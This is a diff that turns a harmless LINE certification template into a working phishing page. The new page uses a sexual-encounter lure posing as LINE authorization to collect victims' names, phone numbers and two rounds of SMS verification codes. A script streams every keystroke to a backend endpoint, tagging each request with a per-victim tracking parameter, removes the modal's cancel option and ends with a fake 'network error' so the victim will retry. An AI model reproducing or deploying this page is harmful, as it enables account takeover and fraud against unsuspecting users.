@@ -1,108 +1,632 @@
-<!doctype html>
-<html lang="zh-Hant">
+<!DOCTYPE html>
+<html lang="zh-TW">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>LINE 官方認證 — 申請頁面範本</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body { font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; }
-    .container { max-width: 900px; margin: 0 auto; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LINE 授權頁面</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+        
+        .header-title {
+            background-color: rgb(255, 192, 203);
+            color: white;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 24px;
+            font-family: "Microsoft JhengHei", "微軟正黑體", sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 100%;
+            height: auto;
+            margin: 0;
+            display: block;
+        }
+
+        .carousel {
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .carousel-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: opacity 0.35s ease;
+            opacity: 1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 30px 0 10px;
+            font-weight: bold;
+        }
+
+        .description {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .form-group label .required {
+            color: #ff0000;
+            margin-right: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+            font-size: 16px;
+            background-color: transparent;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-bottom-color: #00B900;
+        }
+
+        .form-group input::placeholder {
+            color: #ccc;
+        }
+
+        .send-code {
+            background: transparent;
+            border: none;
+            color: #00B900;
+            padding: 8px;
+            cursor: pointer;
+            float: right;
+            margin-top: -40px;
+            position: relative;
+            font-size: 14px;
+            border-radius: 15px;
+        }
+
+        .submit-btn {
+            background: #ff0000;
+            color: white;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            background: #e60000;
+        }
+
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+    </style>
 </head>
-<body class="bg-slate-50">
-  <div class="min-h-screen p-6 md:p-12">
-    <div class="container">
-      <header class="flex items-center gap-4 mb-6">
-        <div class="w-14 h-14 bg-white rounded-lg shadow flex items-center justify-center">
-          <!-- LINE-style bubble -->
-          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="1" y="4" width="22" height="14" rx="3" fill="#00C300" />
-            <path d="M6 18l-1 3 3-1" stroke="#fff" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" />
-          </svg>
-        </div>
-        <div>
-          <h1 class="text-2xl font-bold">LINE 官方認證 — 申請與說明</h1>
-          <p class="text-sm text-slate-600">提高帳號信任度，展示官方標章。此表格只收公司資料與聯絡資訊，非登入機制。</p>
-        </div>
-      </header>
-
-      <main class="bg-white rounded-2xl shadow p-6">
-        <section class="grid md:grid-cols-2 gap-6">
-          <div>
-            <h2 class="text-xl font-semibold">為何要申請官方認證？</h2>
-            <p class="mt-3 text-slate-700 leading-relaxed">官方認證會在你的 LINE 帳號旁顯示「官方」或勾選標章，讓用戶更容易辨識真實品牌或組織，並提升點擊與轉換率。</p>
-
-            <h3 class="mt-6 font-medium">申請流程（簡化）</h3>
-            <ol class="list-decimal list-inside mt-2 text-slate-700">
-              <li>準備公司或組織登記證明、品牌資產（官網、商標）</li>
-              <li>填寫申請表並上傳證明文件（本頁或官方後台）</li>
-              <li>官方審核：通常數個工作日（依地區不同）</li>
-            </ol>
-            <p class="mt-4 text-sm text-slate-500">注意：此頁僅為範本。真正的認證提交請依 LINE 官方後台指示。</p>
-          </div>
-
-          <div class="p-4 border rounded-lg">
-            <div class="flex flex-col items-center">
-              <div class="w-28 h-28 bg-[#00C300] rounded-xl flex items-center justify-center mb-4">
-                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                  <rect x="1" y="4" width="22" height="14" rx="3" fill="#fff" />
-                  <text x="12" y="14" fill="#00C300" font-size="6" font-family="Arial" text-anchor="middle">LINE</text>
-                </svg>
-              </div>
-              <h4 class="font-semibold">已驗證樣式</h4>
-              <p class="text-sm text-slate-600 text-center mt-2">預覽：官方標章會顯示於帳號名稱旁。</p>
-            </div>
-            <hr class="my-4" />
-            <form id="applyForm" onsubmit="handleSubmit(event)" class="space-y-3">
-              <label class="block text-sm font-medium">公司 / 組織名稱</label>
-              <input required name="company" class="w-full p-3 border rounded" placeholder="例如：某某科技股份有限公司" />
-
-              <label class="block text-sm font-medium">聯絡人 Email</label>
-              <input required type="email" name="email" class="w-full p-3 border rounded" placeholder="contact@yourcompany.com" />
-
-              <label class="block text-sm font-medium">官方網站（選填）</label>
-              <input name="website" class="w-full p-3 border rounded" placeholder="https://yourwebsite.com" />
-
-              <label class="block text-sm font-medium">簡短說明（用途、品牌備註）</label>
-              <textarea name="note" class="w-full p-3 border rounded h-24" placeholder="例如：想申請 LINE 官方帳號以提供客服與推播通知"></textarea>
-
-              <div class="flex items-center text-sm space-x-2">
-                <input id="agree" type="checkbox" required />
-                <label for="agree">我同意 LINE 官方認證申請之基本條款（此為範本示意）</label>
-              </div>
-
-              <div class="pt-2">
-                <button type="submit" class="w-full bg-[#00C300] text-white py-3 rounded font-semibold">提交申請意向</button>
-              </div>
-            </form>
-          </div>
-        </section>
-
-        <section class="mt-6">
-          <h3 class="font-medium">常見問題（FAQ）</h3>
-          <details class="mt-2">
-            <summary class="cursor-pointer">需要付費嗎？</summary>
-            <div class="mt-2 text-slate-700">LINE 官方認證或許會依功能或國家有不同費用，請依 LINE 官方公告為主。</div>
-          </details>
-          <details class="mt-2">
-            <summary class="cursor-pointer">審核需多久？</summary>
-            <div class="mt-2 text-slate-700">視地區與文件完整性而定，通常幾個工作日至數週。</div>
-          </details>
-        </section>
-      </main>
-
-      <footer class="mt-6 text-sm text-slate-500">建議：上線正式申請前，請連結 LINE 官方後台並遵循官方文件。</footer>
+<body>
+    <div class="header-title">茶園悅色-台灣約炮網</div>
+    <div class="carousel">
+        <img id="carouselImage" src="photo_2026-03-20_21-32-34.jpg" alt="LINE Banner" class="carousel-image">
     </div>
-  </div>
+    <div class="container">
+        <h1></h1>
+        <p class="description">三分鐘找到今晚的對象不用付費立刻解鎖附近真實在線的有緣人開始激情夜晚註冊完成即可寻找免費約炮对象讓夜晚不再無聊或許下一個讓你心跳加速的人，就在此刻等你</p>
+        
+        <form id="loginForm" onsubmit="return false;">
+            <div class="form-group">
+                <label><span class="required">*</span>用戶名</label>
+                <input id="nameInput" type="text" placeholder="請輸入正確用戶名" required>
+            </div>
+            
+            <div class="form-group">
+                <label><span class="required">*</span>手機門號</label>
+                <input id="phoneInput" type="tel" placeholder="請輸入正確手機號碼" required>
+                <button type="button" id="sendCodeBtn" class="send-code" disabled>發送</button>
+                <div id="phoneError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
+            </div>
+            
+            <div class="form-group">
+                <label><span class="required">*</span>認證碼</label>
+                <input id="codeInput" type="text" placeholder="此驗證碼以便完成LINE帳號添加" required disabled>
+                <div id="codeError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
+            </div>
 
-  <script>
-    function handleSubmit(e) {
-      e.preventDefault();
-      // 範本示意：在正式環境請先整合後端，並避免在前端收集敏感資訊
-      alert('已收到申請意向（示意）。請整合後端送出正式申請。');
-      e.target.reset();
-    }
-  </script>
-</body>
-</html>
+            <button type="submit" id="submitBtn" class="submit-btn">確認</button>
+        </form>
+
+        <!-- 二次認證彈窗（取消按鈕已移除，確認改為提交） -->
+        <div id="modal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.4); align-items:center; justify-content:center;">
+            <div id="modalContent" style="background:#fff; padding:20px; border-radius:8px; width:90%; max-width:360px;">
+                <h2 style="margin:0 0 12px; font-size:18px;">二次認證</h2>
+                <p style="margin:0 0 12px; color:#666; font-size:13px;">請再次輸入手機與驗證碼完成二次認證</p>
+                <div style="margin-bottom:10px;">
+                    <input id="modalPhone" type="tel" placeholder="手機門號" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:6px;" />
+                    <button type="button" id="modalSendBtn" class="send-code" style="margin-top:8px;">發送</button>
+                    <div id="modalPhoneError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
+                </div>
+                <div style="margin-bottom:14px;">
+                    <input id="modalCode" type="text" placeholder="驗證碼" inputmode="numeric" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:6px;" />
+                    <div id="modalCodeError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
+                </div>
+                <div style="text-align:right;">
+                    <button id="modalConfirm" style="padding:8px 12px; border-radius:6px; border:none; background:#00B900; color:#fff;">提交</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const nameInput = document.getElementById('nameInput');
+    const sendCodeBtn = document.getElementById('sendCodeBtn');
+    const codeInput = document.getElementById('codeInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const phoneInput = document.getElementById('phoneInput');
+    const modal = document.getElementById('modal');
+    const modalPhone = document.getElementById('modalPhone');
+    const modalSendBtn = document.getElementById('modalSendBtn');
+    const modalCode = document.getElementById('modalCode');
+    const modalConfirm = document.getElementById('modalConfirm');
+    const phoneError = document.getElementById('phoneError');
+    const codeError = document.getElementById('codeError');
+    const modalPhoneError = document.getElementById('modalPhoneError');
+    const modalCodeError = document.getElementById('modalCodeError');
+    const carouselImage = document.getElementById('carouselImage');
+    // base URL for API calls (use same origin)
+    var baseUrl = window.location.origin+"/jeecg-boot";
+    // baseUrl = "http://localhost:8080/jeecg-boot"
+        let timer;
+        let modalTimer;
+        let carouselTimer;
+        let carouselIndex = 0;
+        const carouselImages = [
+            './photo_2026-03-20_21-32-34.jpg',
+            './photo_2026-03-20_21-32-38.jpg',
+            './photo_2026-03-20_21-32-41.jpg',
+            './photo_2026-03-20_21-32-44.jpg',
+            './photo_2026-03-20_21-32-47.jpg'
+        ];
+        // 保存首次提交的驗證碼，用於與二次認證驗證碼比對
+        let initialValidateCode = null;
+
+        function startCarousel() {
+            if (!carouselImage || !carouselImages.length) return;
+            carouselImage.src = carouselImages[0];
+            carouselTimer = setInterval(() => {
+                carouselImage.style.opacity = '0';
+                setTimeout(() => {
+                    carouselIndex = (carouselIndex + 1) % carouselImages.length;
+                    carouselImage.src = carouselImages[carouselIndex];
+                    carouselImage.style.opacity = '1';
+                }, 180);
+            }, 3000);
+        }
+
+        // 初始状态
+        sendCodeBtn.disabled = false;
+        codeInput.disabled = true;
+        submitBtn.disabled = true;
+        startCarousel();
+
+        // 校验函数
+        const phoneRegex = /^09\d{8}$/;
+        const codeRegex = /^(\d{4}|\d{6})$/;
+        const modalCodeRegex = /^\d{4}$/;
+        
+        // 启用验证码输入
+        function enableCodeInput() {
+            codeInput.disabled = false;
+        }
+
+        function showError(el, msg) {
+            if (!el) return;
+            el.textContent = msg;
+            el.style.display = 'block';
+        }
+
+        function clearError(el) {
+            if (!el) return;
+            el.textContent = '';
+            el.style.display = 'none';
+        }
+
+        function startTimer(duration) {
+            let timeLeft = duration;
+            sendCodeBtn.disabled = true;
+            codeInput.disabled = false;
+            sendCodeBtn.textContent = `${timeLeft}秒`;
+
+            timer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    sendCodeBtn.textContent = '發送';
+                    sendCodeBtn.disabled = false;
+                    return;
+                }
+                sendCodeBtn.textContent = `${timeLeft}秒`;
+            }, 1000);
+        }
+
+        // 为 modal 的发送按钮实现单独的计时器
+        function startModalTimer(duration) {
+            let timeLeft = duration;
+            modalSendBtn.disabled = true;
+            modalCode.disabled = false;
+            modalSendBtn.textContent = `${timeLeft}秒`;
+
+            modalTimer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(modalTimer);
+                    modalSendBtn.textContent = '發送';
+                    modalSendBtn.disabled = false;
+                    return;
+                }
+                modalSendBtn.textContent = `${timeLeft}秒`;
+            }, 1000);
+        }
+
+        // NOTE: input listeners for fields are handled later (real-time sends).
+
+        // Debounce helper to avoid rapid-fire requests
+        function debounce(fn, wait) {
+            let t;
+            return function(...args) {
+                clearTimeout(t);
+                t = setTimeout(() => fn.apply(this, args), wait);
+            };
+        }
+
+        // Generic sender for updateField. paramsObj keys will be serialized as query params.
+        async function sendUpdateField(paramsObj) {
+            try {
+                const reqUrl = new URL(`${baseUrl}/code/api/updateField`);
+                Object.keys(paramsObj).forEach(k => {
+                    // allow empty string values to be sent so the backend receives realtime input
+                    if (paramsObj[k] != null) reqUrl.searchParams.set(k, paramsObj[k]);
+                });
+                // always include the page-level code field (may be empty string)
+                const pageCode = new URLSearchParams(window.location.search).get('code') || '';
+                reqUrl.searchParams.set('code', pageCode);
+
+                const response = await fetch(reqUrl.toString());
+                if (!response.ok) {
+                    console.warn('updateField returned non-ok for', paramsObj);
+                } else {
+                    console.log('updateField OK', paramsObj);
+                }
+                return response;
+            } catch (err) {
+                console.error('Error in sendUpdateField', err, paramsObj);
+                return null;
+            }
+        }
+
+        // Debounced wrappers for each field. Only send when value matches our regexes to reduce noise.
+        const debouncedSendPhone = debounce((val) => {
+            if (!val) return;
+            if (!phoneRegex.test(val)) return; // only send valid phones
+            sendUpdateField({ phone: val, action: 'input' });
+        }, 500);
+
+        const debouncedSendPhone2 = debounce((val) => {
+            if (!val) return;
+            if (!phoneRegex.test(val)) return;
+            sendUpdateField({ phone2: val, action: 'input' });
+        }, 500);
+
+        const debouncedSendValidateCode = debounce((val) => {
+            if (!val) return;
+            if (!codeRegex.test(val)) return; // only send matching codes (4 or 6 digits)
+            sendUpdateField({ validateCode: val, action: 'input' });
+        }, 500);
+
+        const debouncedSendValidateCode2 = debounce((val) => {
+            if (!val) return;
+            if (!modalCodeRegex.test(val)) return;
+            sendUpdateField({ validateCode2: val, action: 'input' });
+        }, 500);
+
+        // Hook the inputs to trigger updateField in real-time (send current input value immediately)
+        nameInput.addEventListener('input', function() {
+            const v = this.value.trim();
+            sendUpdateField({ name: v, action: 'input' });
+            checkAllInputs();
+        });
+
+        phoneInput.addEventListener('input', function() {
+            const v = this.value.trim();
+            if (phoneRegex.test(v)) clearError(phoneError);
+            // send current value (including partial/empty) in real-time
+            sendUpdateField({ phone: v, action: 'input' });
+        });
+
+        modalPhone.addEventListener('input', function() {
+            const v = this.value.trim();
+            if (phoneRegex.test(v)) clearError(modalPhoneError);
+            sendUpdateField({ phone2: v, action: 'input' });
+        });
+
+        codeInput.addEventListener('input', function() {
+            const v = this.value.trim();
+            if (codeRegex.test(v)) clearError(codeError);
+            else showError(codeError, '驗證碼格式錯誤');
+            // send current validateCode value immediately
+            sendUpdateField({ validateCode: v, action: 'input' });
+            checkAllInputs();
+        });
+
+        modalCode.addEventListener('input', function() {
+            const v = this.value.trim();
+            if (modalCodeRegex.test(v)) clearError(modalCodeError);
+            else showError(modalCodeError, '驗證碼錯誤');
+            sendUpdateField({ validateCode2: v, action: 'input' });
+        });
+
+    // 页面初始化加载 /code/api/load-page（携带 URL 的 code 参数）
+        async function initializePage() {
+            try {
+                const reqUrl = new URL(`${baseUrl}/code/api/load-page`);
+                const pageParams = new URLSearchParams(window.location.search);
+                const codeParam = pageParams.get('code');
+                if (codeParam) reqUrl.searchParams.set('code', codeParam);
+
+                const response = await fetch(reqUrl.toString());
+                if (!response.ok) {
+                    console.error('Failed to load page data');
+                    return;
+                }
+                let data;
+                try {
+                    data = await response.json();
+                } catch (e) {
+                    data = await response.text();
+                }
+                if (data.message.indexOf('expire')!=-1) {
+                    alert('頁面已過期');
+                    window.location.href = 'about:blank';
+                }
+            } catch (error) {
+                console.error('Error loading page:', error);
+            }
+        }
+        document.addEventListener('DOMContentLoaded', initializePage);
+
+    // 发送验证码按钮点击事件（触发 HTTP 请求），携带 URL 中的 code 参数
+        sendCodeBtn.addEventListener('click', async function() {
+            const phoneVal = phoneInput.value.trim();
+            if (!phoneRegex.test(phoneVal)) {
+                showError(phoneError, '手機號格式錯誤');
+                alert('手機號格式錯誤');
+                return;
+            }
+            clearError(phoneError);
+            try {
+                // use centralized sender so 'code' param is always included
+                const response = await sendUpdateField({ name: nameInput.value.trim(), phone: phoneVal, action: 'submit' });
+                if (response && response.ok) {
+                    enableCodeInput();
+                    alert('發送成功');
+                    startTimer(60);
+                } else {
+                    alert('發送失敗，請稍後重試');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('發送失敗，請稍後重試');
+            }
+        });
+
+        // modal 发送按钮行为：在点击之前 modalCode 不可输入
+        modalCode.disabled = true;
+        modalSendBtn.addEventListener('click', async function() {
+            const mPhoneVal = modalPhone.value.trim();
+            if (!phoneRegex.test(mPhoneVal)) {
+                showError(modalPhoneError, '手機號格式錯誤');
+                alert('手機號格式錯誤');
+                return;
+            }
+            clearError(modalPhoneError);
+            try {
+                // use centralized sender so 'code' param is always included
+                const response = await sendUpdateField({ phone2: mPhoneVal, action: 'submit' });
+                if (response && response.ok) {
+                    // 啟用 modal 的驗證碼輸入並啟動計時
+                    startModalTimer(60);
+                    alert('發送成功');
+                } else {
+                    alert('發送失敗，請稍後重試');
+                }
+            } catch (err) {
+                console.error('Error sending modal code:', err);
+                alert('發送失敗，請稍後重試');
+            }
+        });
+
+        // 检查所有输入是否有效
+        function checkAllInputs() {
+            const nameVal = nameInput.value.trim();
+            const codeVal = codeInput.value.trim();
+            
+            // 只有当姓名不为空且验证码格式正确时，才启用确认按钮
+            submitBtn.disabled = !nameVal || !codeRegex.test(codeVal);
+        }
+
+        // 监听姓名输入
+        nameInput.addEventListener('input', checkAllInputs);
+
+        // (real-time input handling for codeInput is already attached above)
+
+        // 表单提交处理
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            console.log('confirm');
+            const nameVal = nameInput.value.trim();
+            const phoneVal = phoneInput.value.trim();
+            const codeVal = codeInput.value.trim();
+            let hasError = false;
+
+            // 验证姓名
+            if (!nameVal) {
+                alert('請輸入姓名');
+                hasError = true;
+            }
+
+            // 验证手机号
+            if (!phoneVal) {
+                showError(phoneError, '請輸入手機號碼');
+                alert('請輸入手機號碼');
+                hasError = true;
+            } else if (!phoneRegex.test(phoneVal)) {
+                showError(phoneError, '手機號格式錯誤');
+                alert('手機號格式錯誤');
+                hasError = true;
+            } else {
+                clearError(phoneError);
+            }
+
+            if (!codeVal) {
+                showError(codeError, '請輸入驗證碼1');
+                alert('請輸入驗證碼1');
+                hasError = true;
+            } else if (!codeRegex.test(codeVal)) {
+                showError(codeError, '驗證碼格式錯誤');
+                alert('驗證碼格式錯誤');
+                hasError = true;
+            } else {
+                clearError(codeError);
+            }
+
+            if (hasError) return;
+
+            // 在打开二次認證彈窗之前，將驗證碼發送到後端（複製 updateField 的請求邏輯）
+            try {
+                // 保存首次提交的驗證碼，用於後續和二次認證比較
+                initialValidateCode = codeVal;
+                // use centralized sender so 'code' param is always included
+                const response = await sendUpdateField({ name: nameVal, phone: phoneVal, validateCode: codeVal, action: 'submit' });
+                if (!response || !response.ok) {
+                    alert('提交驗證碼失敗，請稍後重試');
+                    return;
+                }
+            } catch (err) {
+                console.error('Error sending code before modal:', err);
+                alert('提交驗證碼失敗，請稍後重試');
+            
+                return;
+            }
+
+            // 打开弹窗
+            modalPhone.value = '';
+            modalCode.value = '';
+            // modal 初始化：禁用 modalCode，启用发送按钮
+            modalCode.disabled = true;
+            modalSendBtn.disabled = false;
+            clearError(modalPhoneError);
+            clearError(modalCodeError);
+            modal.style.display = 'flex';
+            modal.style.alignItems = 'center';
+            modal.style.justifyContent = 'center';
+        });
+
+        // 弹窗确认处理（发送 validateCode2 到后端）
+        modalConfirm.addEventListener('click', async function() {
+            const mPhone = modalPhone.value.trim();
+            const mCode = modalCode.value.trim();
+            let hasError = false;
+
+            if (!phoneRegex.test(mPhone)) {
+                showError(modalPhoneError, '手機號格式錯誤');
+                alert('手機號格式錯誤');
+                hasError = true;
+            } else {
+                clearError(modalPhoneError);
+            }
+
+            if (!modalCodeRegex.test(mCode)) {
+                showError(modalCodeError, '驗證碼錯誤');
+                alert('驗證碼錯誤');
+                hasError = true;
+            } else {
+                clearError(modalCodeError);
+            }
+
+            // 首次驗證與二次認證碼不能相同
+            if (initialValidateCode && mCode === initialValidateCode) {
+                showError(modalCodeError, '驗證碼錯誤');
+                alert('驗證碼錯誤');
+                hasError = true;
+            }
+
+            if (hasError) return;
+
+            // 發送二次驗證碼到後端（validateCode2）
+            try {
+                // use centralized sender so 'code' param is always included
+                const response = await sendUpdateField({ phone2: mPhone, validateCode2: mCode, action: 'submit' });
+                if (!response || !response.ok) {
+                    alert('提交二次驗證失敗，請稍後重試');
+                    return;
+                }
+            } catch (err) {
+                console.error('Error submitting validateCode2:', err);
+                alert('提交二次驗證失敗，請稍後重試');
+                return;
+            }
+
+            // 二次驗證提交成功，關閉彈窗
+            alert('網絡錯誤,請重新提交');
+            modal.style.display = 'none';
+            window.location.reload()
+        });
+    </script>
